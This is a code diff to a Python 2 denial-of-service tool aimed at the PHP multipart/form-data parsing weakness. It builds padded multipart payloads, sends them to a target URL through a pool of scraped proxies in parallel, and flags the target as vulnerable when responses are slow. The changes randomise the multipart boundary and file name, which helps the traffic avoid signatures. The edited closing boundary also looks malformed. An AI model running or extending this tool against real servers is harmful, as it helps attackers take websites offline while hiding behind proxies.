@@ -7,7 +7,7 @@ Multiprocessing and proxy
 Author: typcn
 Welcome to http://blog.eqoe.cn
 
-Some error handling
+Some error handling, random boundary
 Author: Beining
 http://www.cnbeining.com
 
@@ -25,9 +25,6 @@ WARNING: USE THIS TOOL AT YOUR OWN RISK
 
 # WARNING: USE THIS TOOL AT YOUR OWN RISK
 
-import sys
-import os
-
 if __name__ == '__main__':
     #unittest.main()
     pass
@@ -43,27 +40,44 @@ import time
 import random
 from optparse import OptionParser
 from multiprocessing import Pool
+import string
+import random
 
+#----------------------------------------------------------------------
+def generate_string(stat, length):
+    """(str,int)->str
+    generate string as required."""
+    stat_final = ''
+    if 'u' in str(stat).lower():
+        stat_final += string.ascii_uppercase
+    if 'l' in str(stat).lower():
+        stat_final += string.ascii_lowercase
+    if 'd' in str(stat).lower():
+        stat_final += string.digits
+    return ''.join(random.SystemRandom().choice(stat_final) for _ in range(int(length)))
 
 def check_php_multipartform_dos(url, post_body, headers, ip):
-    proxy_handler = urllib2.ProxyHandler({"http": ip})
-    null_proxy_handler = urllib2.ProxyHandler({})
-    opener = urllib2.build_opener(proxy_handler)
-    urllib2.install_opener(opener)
-    req = urllib2.Request(url)
-    for key in headers.keys():
-        req.add_header(key, headers[key])
-    starttime = datetime.datetime.now()
-    fd = urllib2.urlopen(req, post_body)
-    html = fd.read()
-    endtime = datetime.datetime.now()
-    usetime = (endtime - starttime).seconds
-    if(usetime > 5):
-        result = url + " is vulnerable"
-    else:
-        if(usetime > 3):
-            result = "need to check normal respond time"
-    return [result, usetime]
+    try:
+        proxy_handler = urllib2.ProxyHandler({"http": ip})
+        null_proxy_handler = urllib2.ProxyHandler({})
+        opener = urllib2.build_opener(proxy_handler)
+        urllib2.install_opener(opener)
+        req = urllib2.Request(url)
+        for key in headers.keys():
+            req.add_header(key, headers[key])
+        starttime = datetime.datetime.now()
+        fd = urllib2.urlopen(req, post_body)
+        html = fd.read()
+        endtime = datetime.datetime.now()
+        usetime = (endtime - starttime).seconds
+        if(usetime > 5):
+            result = url + " is vulnerable"
+        else:
+            if(usetime > 3):
+                result = "need to check normal respond time"
+        return [result, usetime]
+    except KeyboardInterrupt:
+        exit()
 
 
 def get_stock_html(URL):
@@ -123,21 +137,23 @@ def main():
     else:
         return
     Num = request_num
+    random_boundary = generate_string('ulr', 16)
     headers = {
         'Content-Type':
-        'multipart/form-data; boundary=----WebKitFormBoundaryX3B7rDMPcQlzmJE1',
+        'multipart/form-data; boundary=----WebKitFormBoundary{random_boundary}'.format(random_boundary = random_boundary),
         'Accept-Encoding': 'gzip, deflate',
         'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36'}
-    body = "------WebKitFormBoundaryX3B7rDMPcQlzmJE1\nContent-Disposition: form-data; name=\"file\"; filename=sp.jpg"
+    body = "------WebKitFormBoundary{random_boundary}\nContent-Disposition: form-data; name=\"file\"; filename={random_name}.jpg".format(random_boundary = random_boundary, random_name = generate_string('ulr', 8))
     payload = ""
     for i in range(0, Num):
         payload = payload + "a\n"
     body = body + payload
     body = body + \
-        "Content-Type: application/octet-stream\r\n\r\ndatadata\r\n------WebKitFormBoundaryX3B7rDMPcQlzmJE1--"
+        "Content-Type: application/octet-stream\r\n\r\ndatadata\r\n------{random_boundary}".format(random_boundary = random_boundary)
     print "starting..."
     try:
         Getting_list()
+        print('PROXY LIST READY')
         pool = Pool(int(thread))
         for ip in IP_Port:
             pool.apply_async(
